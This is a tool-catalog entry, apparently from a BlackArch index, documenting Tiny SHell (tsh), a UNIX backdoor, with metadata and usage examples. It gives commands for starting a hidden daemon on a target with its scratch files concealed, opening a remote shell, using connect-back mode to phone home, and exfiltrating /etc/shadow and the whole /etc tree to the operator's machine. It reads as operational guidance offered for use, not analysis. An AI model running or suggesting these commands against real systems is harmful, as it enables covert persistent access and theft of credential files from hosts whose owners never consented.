---
name: "tsh"
categories:
  - blackarch-backdoor
version: "0.6"
homepage: "http://packetstormsecurity.com/search/?q=tsh"
packaged-by: [blackarch]
blackarch-builddate: "2018-11-15"
build-system: scripts
license: custom
meta-checked: "2026-11-09"
github-repo: "orangetw/tsh"
github-stars: 713
github-pushed: "2013-09-28"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 2.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# tsh

> An open-source UNIX backdoor that compiles on all variants, has full pty support, and uses strong crypto for communication.

*No corpus evidence — derived from upstream documentation. The original distribution is the anonymous author's 0.6 release on Packet Storm; the linked GitHub repo is a faithful mirror of that same code (identical README and version).*

## What it's for

Tiny SHell, a minimal UNIX backdoor in two small C programs: the server `tshd` and the client `tsh`. Both share a secret key and the server port, compiled in from `tsh.h` — deployment means configuring that header once and building for the target system (linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf). It gives you an interactive shell with a full pty (Ctrl-C, tab completion and terminal resizing behave), one-shot command execution, and `get`/`put` file transfer, all encrypted with the compiled key. A connect-back mode (`CONNECT_BACK_HOST` in `tsh.h`) suits firewalled hosts. Limits worth knowing: no recursive or multiple file transfers (work around with a tar pipe), and the secret key sits in cleartext inside both binaries, so restrict read access to them.

## Typical use cases

### Start the server on the target

```
umask 077; HOME=/var/tmp ./tshd
```

Outcome: `tshd` daemonizes and listens on the compiled `SERVER_PORT` for a client presenting the matching key. The `umask`/`HOME` prefix keeps the scratch files it creates private and out of home-directory listings.

### Open an interactive shell

```
./tsh target.example.com
```

Outcome: full-pty interactive shell on the remote host. If the server was built in connect-back mode, run the client first and address it as `cb` (`./tsh cb`) — the server then phones home to your listener.

### Run a single command

```
./tsh target.example.com "uname -a"
```

Outcome: executes the command remotely, prints its output and exits — convenient for scripted health checks against a planted server.

### Pull a file off the target

```
./tsh target.example.com get /etc/shadow .
```

Outcome: transfers the remote file into the current directory; `put <local> <remote-dir>` is the mirror-image upload. For whole trees, pipe a tar through the exec channel: `./tsh target.example.com "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf -`.
